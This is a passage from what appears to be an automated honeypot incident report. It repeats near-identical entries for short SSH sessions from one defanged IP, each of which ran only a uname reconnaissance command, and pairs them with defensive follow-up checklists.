| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:45` | `cowrie.session.connect` |
| `2026-08-14 07:11:45` | `cowrie.client.version` |
| `2026-08-14 07:11:45` | `cowrie.client.kex` |
| `2026-08-14 07:11:46` | `cowrie.login.success` |
| `2026-08-14 07:11:46` | `cowrie.session.params` |
| `2026-08-14 07:11:46` | `cowrie.command.input` |
| `2026-08-14 07:11:47` | `cowrie.log.closed` |
| `2026-08-14 07:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47e97199baf2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:50` | `cowrie.session.connect` |
| `2026-08-14 07:11:50` | `cowrie.client.version` |
| `2026-08-14 07:11:50` | `cowrie.client.kex` |
| `2026-08-14 07:11:50` | `cowrie.login.success` |
| `2026-08-14 07:11:51` | `cowrie.session.params` |
| `2026-08-14 07:11:51` | `cowrie.command.input` |
| `2026-08-14 07:11:51` | `cowrie.log.closed` |
| `2026-08-14 07:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfeda2d9da2c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:11 |
| **Last Seen** | 2026-08-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:11:55` | `cowrie.session.connect` |
| `2026-08-14 07:11:55` | `cowrie.client.version` |
| `2026-08-14 07:11:55` | `cowrie.client.kex` |
| `2026-08-14 07:11:55` | `cowrie.login.success` |
| `2026-08-14 07:11:56` | `cowrie.session.params` |
| `2026-08-14 07:11:56` | `cowrie.command.input` |
| `2026-08-14 07:11:56` | `cowrie.log.closed` |
| `2026-08-14 07:11:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62d752f5139f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:00` | `cowrie.session.connect` |
| `2026-08-14 07:12:00` | `cowrie.client.version` |
| `2026-08-14 07:12:00` | `cowrie.client.kex` |
| `2026-08-14 07:12:00` | `cowrie.login.success` |
| `2026-08-14 07:12:01` | `cowrie.session.params` |
| `2026-08-14 07:12:01` | `cowrie.command.input` |
| `2026-08-14 07:12:01` | `cowrie.log.closed` |
| `2026-08-14 07:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cadf430346d1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:05` | `cowrie.session.connect` |
| `2026-08-14 07:12:05` | `cowrie.client.version` |
| `2026-08-14 07:12:05` | `cowrie.client.kex` |
| `2026-08-14 07:12:05` | `cowrie.login.success` |
| `2026-08-14 07:12:06` | `cowrie.session.params` |
| `2026-08-14 07:12:06` | `cowrie.command.input` |
| `2026-08-14 07:12:06` | `cowrie.log.closed` |
| `2026-08-14 07:12:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfc219af7af6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:10` | `cowrie.session.connect` |
| `2026-08-14 07:12:10` | `cowrie.client.version` |
| `2026-08-14 07:12:10` | `cowrie.client.kex` |
| `2026-08-14 07:12:10` | `cowrie.login.success` |
| `2026-08-14 07:12:11` | `cowrie.session.params` |
| `2026-08-14 07:12:11` | `cowrie.command.input` |
| `2026-08-14 07:12:11` | `cowrie.log.closed` |
| `2026-08-14 07:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0419bf8d8ec8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:15` | `cowrie.session.connect` |
| `2026-08-14 07:12:15` | `cowrie.client.version` |
| `2026-08-14 07:12:15` | `cowrie.client.kex` |
| `2026-08-14 07:12:16` | `cowrie.login.success` |
| `2026-08-14 07:12:16` | `cowrie.session.params` |
| `2026-08-14 07:12:16` | `cowrie.command.input` |
| `2026-08-14 07:12:16` | `cowrie.log.closed` |
| `2026-08-14 07:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03f1be4072ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:20` | `cowrie.session.connect` |
| `2026-08-14 07:12:20` | `cowrie.client.version` |
| `2026-08-14 07:12:20` | `cowrie.client.kex` |
| `2026-08-14 07:12:21` | `cowrie.login.success` |
| `2026-08-14 07:12:22` | `cowrie.session.params` |
| `2026-08-14 07:12:22` | `cowrie.command.input` |
| `2026-08-14 07:12:22` | `cowrie.log.closed` |
| `2026-08-14 07:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8994579544f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:25` | `cowrie.session.connect` |
| `2026-08-14 07:12:25` | `cowrie.client.version` |
| `2026-08-14 07:12:25` | `cowrie.client.kex` |
| `2026-08-14 07:12:26` | `cowrie.login.success` |
| `2026-08-14 07:12:27` | `cowrie.session.params` |
| `2026-08-14 07:12:27` | `cowrie.command.input` |
| `2026-08-14 07:12:27` | `cowrie.log.closed` |
| `2026-08-14 07:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc120e390e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:30` | `cowrie.session.connect` |
| `2026-08-14 07:12:30` | `cowrie.client.version` |
| `2026-08-14 07:12:30` | `cowrie.client.kex` |
| `2026-08-14 07:12:31` | `cowrie.login.success` |
| `2026-08-14 07:12:32` | `cowrie.session.params` |
| `2026-08-14 07:12:32` | `cowrie.command.input` |
| `2026-08-14 07:12:32` | `cowrie.log.closed` |
| `2026-08-14 07:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3678bf40867c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:35` | `cowrie.session.connect` |
| `2026-08-14 07:12:35` | `cowrie.client.version` |
| `2026-08-14 07:12:35` | `cowrie.client.kex` |
| `2026-08-14 07:12:36` | `cowrie.login.success` |
| `2026-08-14 07:12:37` | `cowrie.session.params` |
| `2026-08-14 07:12:37` | `cowrie.command.input` |
| `2026-08-14 07:12:37` | `cowrie.log.closed` |
| `2026-08-14 07:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8496f724069b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:40` | `cowrie.session.connect` |
| `2026-08-14 07:12:40` | `cowrie.client.version` |
| `2026-08-14 07:12:40` | `cowrie.client.kex` |
| `2026-08-14 07:12:41` | `cowrie.login.success` |
| `2026-08-14 07:12:42` | `cowrie.session.params` |
| `2026-08-14 07:12:42` | `cowrie.command.input` |
| `2026-08-14 07:12:42` | `cowrie.log.closed` |
| `2026-08-14 07:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eafe0e64d8ee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:45` | `cowrie.session.connect` |
| `2026-08-14 07:12:45` | `cowrie.client.version` |
| `2026-08-14 07:12:45` | `cowrie.client.kex` |
| `2026-08-14 07:12:46` | `cowrie.login.success` |
| `2026-08-14 07:12:46` | `cowrie.session.params` |
| `2026-08-14 07:12:46` | `cowrie.command.input` |
| `2026-08-14 07:12:46` | `cowrie.log.closed` |
| `2026-08-14 07:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3420d4feb143

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:51` | `cowrie.session.connect` |
| `2026-08-14 07:12:51` | `cowrie.client.version` |
| `2026-08-14 07:12:51` | `cowrie.client.kex` |
| `2026-08-14 07:12:51` | `cowrie.login.success` |
| `2026-08-14 07:12:52` | `cowrie.session.params` |
| `2026-08-14 07:12:52` | `cowrie.command.input` |
| `2026-08-14 07:12:52` | `cowrie.log.closed` |
| `2026-08-14 07:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45d64613d343

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:12 |
| **Last Seen** | 2026-08-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:12:55` | `cowrie.session.connect` |
| `2026-08-14 07:12:55` | `cowrie.client.version` |
| `2026-08-14 07:12:56` | `cowrie.client.kex` |
| `2026-08-14 07:12:56` | `cowrie.login.success` |
| `2026-08-14 07:12:57` | `cowrie.session.params` |
| `2026-08-14 07:12:57` | `cowrie.command.input` |
| `2026-08-14 07:12:57` | `cowrie.log.closed` |
| `2026-08-14 07:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad30d423ed02

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:00` | `cowrie.session.connect` |
| `2026-08-14 07:13:00` | `cowrie.client.version` |
| `2026-08-14 07:13:01` | `cowrie.client.kex` |
| `2026-08-14 07:13:01` | `cowrie.login.success` |
| `2026-08-14 07:13:02` | `cowrie.session.params` |
| `2026-08-14 07:13:02` | `cowrie.command.input` |
| `2026-08-14 07:13:02` | `cowrie.log.closed` |
| `2026-08-14 07:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35f2584576e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:06` | `cowrie.session.connect` |
| `2026-08-14 07:13:06` | `cowrie.client.version` |
| `2026-08-14 07:13:06` | `cowrie.client.kex` |
| `2026-08-14 07:13:06` | `cowrie.login.success` |
| `2026-08-14 07:13:07` | `cowrie.session.params` |
| `2026-08-14 07:13:07` | `cowrie.command.input` |
| `2026-08-14 07:13:07` | `cowrie.log.closed` |
| `2026-08-14 07:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c91a42bec810

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:11` | `cowrie.session.connect` |
| `2026-08-14 07:13:11` | `cowrie.client.version` |
| `2026-08-14 07:13:11` | `cowrie.client.kex` |
| `2026-08-14 07:13:11` | `cowrie.login.success` |
| `2026-08-14 07:13:12` | `cowrie.session.params` |
| `2026-08-14 07:13:12` | `cowrie.command.input` |
| `2026-08-14 07:13:12` | `cowrie.log.closed` |
| `2026-08-14 07:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a167461aa5ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:15` | `cowrie.session.connect` |
| `2026-08-14 07:13:15` | `cowrie.client.version` |
| `2026-08-14 07:13:16` | `cowrie.client.kex` |
| `2026-08-14 07:13:16` | `cowrie.login.success` |
| `2026-08-14 07:13:17` | `cowrie.session.params` |
| `2026-08-14 07:13:17` | `cowrie.command.input` |
| `2026-08-14 07:13:17` | `cowrie.log.closed` |
| `2026-08-14 07:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf471eb8d89d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:20` | `cowrie.session.connect` |
| `2026-08-14 07:13:21` | `cowrie.client.version` |
| `2026-08-14 07:13:21` | `cowrie.client.kex` |
| `2026-08-14 07:13:21` | `cowrie.login.success` |
| `2026-08-14 07:13:22` | `cowrie.session.params` |
| `2026-08-14 07:13:22` | `cowrie.command.input` |
| `2026-08-14 07:13:22` | `cowrie.log.closed` |
| `2026-08-14 07:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df5781128898

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:25` | `cowrie.session.connect` |
| `2026-08-14 07:13:25` | `cowrie.client.version` |
| `2026-08-14 07:13:26` | `cowrie.client.kex` |
| `2026-08-14 07:13:26` | `cowrie.login.success` |
| `2026-08-14 07:13:27` | `cowrie.session.params` |
| `2026-08-14 07:13:27` | `cowrie.command.input` |
| `2026-08-14 07:13:27` | `cowrie.log.closed` |
| `2026-08-14 07:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-521936e629b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:30` | `cowrie.session.connect` |
| `2026-08-14 07:13:30` | `cowrie.client.version` |
| `2026-08-14 07:13:30` | `cowrie.client.kex` |
| `2026-08-14 07:13:31` | `cowrie.login.success` |
| `2026-08-14 07:13:32` | `cowrie.session.params` |
| `2026-08-14 07:13:32` | `cowrie.command.input` |
| `2026-08-14 07:13:32` | `cowrie.log.closed` |
| `2026-08-14 07:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0e1056c7c56

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:35` | `cowrie.session.connect` |
| `2026-08-14 07:13:35` | `cowrie.client.version` |
| `2026-08-14 07:13:35` | `cowrie.client.kex` |
| `2026-08-14 07:13:36` | `cowrie.login.success` |
| `2026-08-14 07:13:37` | `cowrie.session.params` |
| `2026-08-14 07:13:37` | `cowrie.command.input` |
| `2026-08-14 07:13:37` | `cowrie.log.closed` |
| `2026-08-14 07:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13d5a1fef632

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:40` | `cowrie.session.connect` |
| `2026-08-14 07:13:40` | `cowrie.client.version` |
| `2026-08-14 07:13:40` | `cowrie.client.kex` |
| `2026-08-14 07:13:41` | `cowrie.login.success` |
| `2026-08-14 07:13:42` | `cowrie.session.params` |
| `2026-08-14 07:13:42` | `cowrie.command.input` |
| `2026-08-14 07:13:42` | `cowrie.log.closed` |
| `2026-08-14 07:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4047f9e862a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:45` | `cowrie.session.connect` |
| `2026-08-14 07:13:46` | `cowrie.client.version` |
| `2026-08-14 07:13:46` | `cowrie.client.kex` |
| `2026-08-14 07:13:46` | `cowrie.login.success` |
| `2026-08-14 07:13:47` | `cowrie.session.params` |
| `2026-08-14 07:13:47` | `cowrie.command.input` |
| `2026-08-14 07:13:47` | `cowrie.log.closed` |
| `2026-08-14 07:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c2c578362bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:51` | `cowrie.session.connect` |
| `2026-08-14 07:13:51` | `cowrie.client.version` |
| `2026-08-14 07:13:51` | `cowrie.client.kex` |
| `2026-08-14 07:13:51` | `cowrie.login.success` |
| `2026-08-14 07:13:52` | `cowrie.session.params` |
| `2026-08-14 07:13:52` | `cowrie.command.input` |
| `2026-08-14 07:13:52` | `cowrie.log.closed` |
